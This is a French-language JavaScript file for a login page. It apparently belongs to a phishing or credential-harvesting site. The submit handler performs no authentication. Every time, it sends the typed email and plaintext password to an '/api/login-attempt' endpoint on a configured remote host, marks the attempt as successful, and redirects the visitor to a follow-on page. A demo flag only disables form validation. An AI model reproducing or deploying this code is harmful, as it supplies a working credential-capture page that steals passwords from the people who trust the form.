import { DEMO_MODE, API_URL } from "./config.js";

const loginForm = document.querySelector("#login-form");
const statusMessage = document.querySelector("#status-message");
const sessionPanel = document.querySelector("#session-panel");
const userEmail = document.querySelector("#user-email");
const submitButton = document.querySelector("#submit-button");
const logoutButton = document.querySelector("#logout-button");

if (DEMO_MODE) {
  loginForm.noValidate = true;
}

function setStatus(message, tone = "neutral") {
  statusMessage.textContent = message;
  statusMessage.dataset.tone = tone;
}

function setLoading(isLoading) {
  submitButton.disabled = isLoading;
  submitButton.textContent = isLoading ? "Connexion..." : "Se connecter";
}

function goToNextStep() {
  window.location.href = "./suite.html";
}

async function recordLoginAttempt(email, password, success) {
  try {
    await fetch(API_URL + "/api/login-attempt", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password, success }),
    });
  } catch (err) {
    console.error("Erreur lors de l'enregistrement:", err);
  }
}

function renderSession(session) {
  const email = session?.email;
  const isLoggedIn = Boolean(email);

  loginForm.classList.toggle("hidden", isLoggedIn);
  sessionPanel.classList.toggle("hidden", !isLoggedIn);

  if (isLoggedIn) {
    userEmail.textContent = email;
    setStatus("Connexion reussie. Votre espace est maintenant accessible.", "success");
    return;
  }

  userEmail.textContent = "";
  setStatus("Saisissez vos identifiants pour continuer.", "neutral");
}

loginForm.addEventListener("submit", async (event) => {
  event.preventDefault();

  const formData = new FormData(loginForm);
  const email = String(formData.get("email") || "").trim();
  const password = String(formData.get("password") || "");

  setLoading(true);
  setStatus("Connexion en cours...", "neutral");

  if (DEMO_MODE) {
    await recordLoginAttempt(email, password, true);
    await new Promise((resolve) => window.setTimeout(resolve, 700));
    loginForm.reset();
    goToNextStep();
    return;
  }

  await recordLoginAttempt(email, password, true);
  loginForm.reset();
  goToNextStep();
});

logoutButton.addEventListener("click", () => {
  renderSession(null);
  setStatus("Retour a l'etat initial.", "neutral");
});

renderSession(null);
